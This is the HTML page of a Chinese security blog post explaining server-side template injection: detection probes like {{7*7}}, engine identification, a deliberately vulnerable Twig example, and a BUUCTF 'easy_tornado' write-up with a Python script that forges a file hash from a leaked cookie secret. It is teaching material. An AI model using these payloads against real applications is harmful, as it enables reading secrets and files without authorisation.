@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+    <meta name="keywords" content="N0us,2er0blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="一、SSTI（Server-Side Template Injection）原理要了解什么是SSTI，首先要说一下什么是模板引擎，下面是百度百科的解释：  模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。  也就是说，使用模板引擎可以将（网站）程序实现界面与数据分离，业务代码和逻">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅析SSTI（服务端模板注入）漏洞">
+<meta property="og:url" content="https://2er0blog.com/2020/03/24/%E6%B5%85%E6%9E%90SSTI%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="N0us&#39;s Blog">
+<meta property="og:description" content="一、SSTI（Server-Side Template Injection）原理要了解什么是SSTI，首先要说一下什么是模板引擎，下面是百度百科的解释：  模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。  也就是说，使用模板引擎可以将（网站）程序实现界面与数据分离，业务代码和逻">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/03/24/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.jpg">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/03/24/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wpc77a4f2da100a5bb.jpg">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/03/24/image.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/03/24/imagef993ad3f164fd876.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/03/24/imagec8e68e66c1edfb44.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/03/24/imagee503d4f2aa2c54dc.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/03/24/image0dc2f4688312e8b2.png">
+<meta property="og:image" content="http://picture.2er0blog.com/images/2020/03/24/image6a3b671675b9706a.png">
+<meta property="article:published_time" content="2020-03-24T04:00:02.000Z">
+<meta property="article:modified_time" content="2020-03-24T14:54:31.868Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SSTI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://picture.2er0blog.com/images/2020/03/24/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.jpg">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>浅析SSTI（服务端模板注入）漏洞 · N0us&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.png" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+        (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date(); a = s.createElement(o),
+        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+        ga('create', 'UA-158093315-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >N0us&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">浅析SSTI（服务端模板注入）漏洞</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>N0us's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            浅析SSTI（服务端模板注入）漏洞
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SSTI">SSTI</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">1.7k</span>Reading time: <span class="post-count reading-time">6 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/24</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="一、SSTI（Server-Side-Template-Injection）原理"><a href="#一、SSTI（Server-Side-Template-Injection）原理" class="headerlink" title="一、SSTI（Server-Side Template Injection）原理"></a>一、SSTI（Server-Side Template Injection）原理</h1><p>要了解什么是SSTI，首先要说一下什么是模板引擎，下面是百度百科的解释：</p>
+<blockquote>
+<p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p>
+</blockquote>
+<p>也就是说，使用模板引擎可以将（网站）程序实现界面与数据分离，业务代码和逻辑代码分离，提升开发效率，同时也使得代码重构变得容易。</p>
+<p>常见的一些模板引擎：</p>
+<ul>
+<li><p>PHP</p>
+<ul>
+<li>Smarty</li>
+<li>Twig</li>
+<li>Blade</li>
+</ul>
+</li>
+<li><p>Java</p>
+<ul>
+<li>JSP</li>
+<li>FreeMarker</li>
+<li>Velocity </li>
+</ul>
+</li>
+<li><p>Python</p>
+<ul>
+<li><p>Jinja2</p>
+</li>
+<li><p>dijango</p>
+</li>
+<li><p>tornado</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>网站应用程序通常会使用一些模板系统进行动态内容的嵌入，而当用户的输入以不安全的方法嵌入到模板中时，就有可能发生模板注入，比如一个使用Twig 模板来问候收件人的邮件服务，如果变量只是传入到模板之中，那么没啥问题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$output = $twig-&gt;render(<span class="string">"Dear &#123;first_name&#125;,"</span>, <span class="keyword">array</span>(<span class="string">"first_name"</span> =&gt; $user.first_name) );</span><br></pre></td></tr></table></figure>
+
+<p>而如果开发者信任了用户的输入而直接在模板内未经过滤的GET一个变量，那么就有可能引起模板注入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$output = $twig-&gt;render($_GET[<span class="string">'custom_email'</span>], <span class="keyword">array</span>(<span class="string">"first_name"</span> =&gt; $user.first_name) );</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">custom_email=&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;</span><br><span class="line"><span class="number">49</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">custom_email=&#123;&#123;<span class="keyword">self</span>&#125;&#125;</span><br><span class="line">Object of <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">__TwigTemplate_7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5</span> <span class="title">could</span> <span class="title">not</span> <span class="title">be</span></span></span><br><span class="line"><span class="class"><span class="title">converted</span> <span class="title">to</span> <span class="title">string</span></span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里用户通过传入非法的<code>custom_email</code>变量控制了模板本身的内容，从而实现了代码的执行，而这里的代码实际上是在沙箱中执行的，但根据所使用的模板引擎，可以结合沙箱逃逸技术而实现任意代码执行。</p>
+<h2 id="二、模板注入漏洞挖掘"><a href="#二、模板注入漏洞挖掘" class="headerlink" title="二、模板注入漏洞挖掘"></a>二、模板注入漏洞挖掘</h2><p>大体流程如下图</p>
+<p><img src="http://picture.2er0blog.com/images/2020/03/24/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.jpg" alt="us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.jpg"></p>
+<h2 id="1-检测阶段"><a href="#1-检测阶段" class="headerlink" title="1.检测阶段"></a>1.检测阶段</h2><p>该漏洞可能出现在两种不同的环境中：</p>
+<ul>
+<li><p><strong>纯文本环境</strong></p>
+<p>大部分模板支持直接输入HTML，通常这样出现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smarty=Hello &#123;user.name&#125;</span><br><span class="line">Hello user1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">freemarker=Hello $&#123;username&#125;</span><br><span class="line">Hello newuser</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">any&#x3D;&lt;b&gt;Hello&lt;&#x2F;b&gt;</span><br><span class="line">&lt;b&gt;Hello&lt;b&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这通常会导致XSS，所以可以使用XSS作为模板注入的探针，虽然不同模板的实现有所不同，但它们的基本语法大致相同，利用这一点，我们可以使用下面的payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">smarty=Hello $&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span><br><span class="line">Hello <span class="number">49</span></span><br><span class="line">freemarker=Hello $&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span><br><span class="line">Hello <span class="number">49</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>代码环境</strong></p>
+<p>作为变量名的用户输入也有可能在代码中出现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">personal_greeting=username</span><br><span class="line">Hello user01</span><br></pre></td></tr></table></figure>
+
+<p>这种情况下，使用XSS检测是行不通的，但是我们可以破坏模板语句并在它后面注入HTML标记来检测：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">personal_greeting&#x3D;username&lt;tag&gt;</span><br><span class="line">Hello</span><br><span class="line">personal_greeting&#x3D;username&#125;&#125;&lt;tag&gt;</span><br><span class="line">Hello user01 &lt;tag&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="2-识别阶段"><a href="#2-识别阶段" class="headerlink" title="2.识别阶段"></a>2.识别阶段</h2><p>检测到模板注入漏洞后，就要开始识别产生漏洞的模板引擎，当有报错信息时，我们有时候可能可以通过报错来确认其所使用的模板引擎，但当异常被捕捉时这种方法就没用了，以下是Burpsuite对不同模板接受的Payload的分类：</p>
+<p><img src="http://picture.2er0blog.com/images/2020/03/24/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wpc77a4f2da100a5bb.jpg" alt="us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wpc77a4f2da100a5bb.jpg"></p>
+<p>绿线表示成功返回，红线失败，同一个Payload在不同的模板引擎中可能返回不同的结果，例如 <code>49</code>在Twig中返回<code>49</code>，而在Jinja2中返回 <code>7777777</code></p>
+<h2 id="3-利用阶段"><a href="#3-利用阶段" class="headerlink" title="3.利用阶段"></a>3.利用阶段</h2><p>当我们成功识别产生漏洞的模板引擎后就进入了漏洞利用阶段，在这个阶段，第一步要做的就是找到并阅读该模板引擎的文档，主要可以关注以下几个方面：</p>
+<ul>
+<li>该模板的基本语法</li>
+<li>安全注意事项——开发者可能会忽略该部分的内容，而我们在利用时也许会从中get到新姿势</li>
+<li>内置方法、函数、过滤器和变量</li>
+<li>插件/扩展——尤其要关注默认开启的</li>
+</ul>
+<p>假设我们没有发现漏洞，那么下一步就是要去探索环境，找出当前环境可利用的函数或对象，许多模板引擎定义了一个<code>self</code>或<code>namespace</code>对象，或者可以列出所有属性和方法的函数</p>
+<p>如果没有的话，那么我们需要爆破变量名</p>
+<p>走到这一步时，我们应该可以去实时攻击了</p>
+<h1 id="三、通过一道CTF题来实践"><a href="#三、通过一道CTF题来实践" class="headerlink" title="三、通过一道CTF题来实践"></a>三、通过一道CTF题来实践</h1><p>这里我选择BUUCTF的easy_tornado这道题来进行实践，顺便也当做这道题的Writeup了</p>
+<p>题目地址：<a href="https://buuoj.cn/challenges#[%E6%8A%A4%E7%BD%91%E6%9D%AF%202018]easy_tornado" target="_blank" rel="noopener">戳我</a></p>
+<p>打开题目是这样的：</p>
+<p><img src="http://picture.2er0blog.com/images/2020/03/24/image.png" alt="image.png"></p>
+<p>依次打开，发现其中的提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag in &#x2F;fllllllllllllag</span><br><span class="line">render</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+
+<p>由此得知flag在/fllllllllllllag里面，故而将文件名改为fllllllllllllag访问，发现跳转到了一个错误页面：</p>
+<p><code>http://5478cafd-258b-4288-a0fb-1e40389e5e13.node3.buuoj.cn/error?msg=Error</code></p>
+<p><img src="http://picture.2er0blog.com/images/2020/03/24/imagef993ad3f164fd876.png" alt="imagef993ad3f164fd876.png"></p>
+<p>当然到这里我们肯定已经知道这里存在模板注入，而如果单纯做题的话，我们也可以从<code>welcome.txt</code>里面提示的<code>render</code>以及题目<strong>tornado</strong>的提示知道这里可能存在模板注入</p>
+<p>那么我们可以先测试一下，传入<code>1</code>：</p>
+<p><code>http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/error?msg=1</code></p>
+<p><img src="http://picture.2er0blog.com/images/2020/03/24/imagec8e68e66c1edfb44.png" alt="imagec8e68e66c1edfb44.png"></p>
+<p>再传入<code>49</code>：</p>
+<p><code>http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/error?msg=49</code></p>
+<p><img src="http://picture.2er0blog.com/images/2020/03/24/imagee503d4f2aa2c54dc.png" alt="imagee503d4f2aa2c54dc.png"></p>
+<p>发现不存在运算</p>
+<p>根据<code>hints.txt</code>的提示，要拿到flag需要拿到cookie，那么肯定是利用这里的漏洞来获取了</p>
+<p>查询tornado的<a href="https://www.tornadoweb.org/en/stable/guide/templates.html" target="_blank" rel="noopener">文档</a>以及师傅们的WP可知，tornado中存在一些可以访问的快速对象，这里我们需要的是<code>handler.settings</code>对象，其中<code>handler</code>指向<code>RequestHandler</code>，而<code>RequestHandler.settings</code>又指向<code>self.application.settings</code>，故<code>handler.settings</code>就指向<code>RequestHandler.application.settings</code></p>
+<blockquote>
+<p>在Tornado中，RequestHandler是HTTP请求处理程序的基类</p>
+</blockquote>
+<p>这时传入<code></code>：</p>
+<p><code>http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/error?msg=</code></p>
+<p><img src="http://picture.2er0blog.com/images/2020/03/24/image0dc2f4688312e8b2.png" alt="image0dc2f4688312e8b2.png"></p>
+<p>拿到cookie，然后根据<code>hints.txt</code>的提示，写出payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://dab00c2b-2bee-4601-a10a-b3324e094b1e.node3.buuoj.cn/file?'</span></span><br><span class="line">filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(ss)</span>:</span></span><br><span class="line">    md5=hashlib.md5()</span><br><span class="line">    md5.update(ss.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span><span class="params">()</span>:</span></span><br><span class="line">    filename=<span class="string">'/fllllllllllllag'</span></span><br><span class="line">    cookie = <span class="string">'3b649d27-41e2-470a-ab84-d5c3ff7520cc'</span></span><br><span class="line">    res = md5(cookie+md5(filename))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    response = s.get(url+ <span class="string">'filename='</span> + filename + <span class="string">'&amp;filehash='</span> + filehash())</span><br><span class="line">    print(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    get_flag()</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag：</p>
+<p><img src="http://picture.2er0blog.com/images/2020/03/24/image6a3b671675b9706a.png" alt="image6a3b671675b9706a.png"></p>
+<h1 id="附：检测模板注入的工具"><a href="#附：检测模板注入的工具" class="headerlink" title="附：检测模板注入的工具"></a>附：检测模板注入的工具</h1><p>GitHub上已经有大佬写出了自动检测SSTI漏洞的工具，本篇文章不再介绍工具的使用，这里我放上地址就好</p>
+<p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">戳我</a></p>
+<blockquote>
+<p>参考资料：</p>
+<ul>
+<li><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X03-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X03-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E</a></p>
+</li>
+<li><p><a href="https://blog.csdn.net/zz_Caleb/article/details/96480967" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/96480967</a></p>
+</li>
+<li><p><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></p>
+</li>
+<li><p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a></p>
+</li>
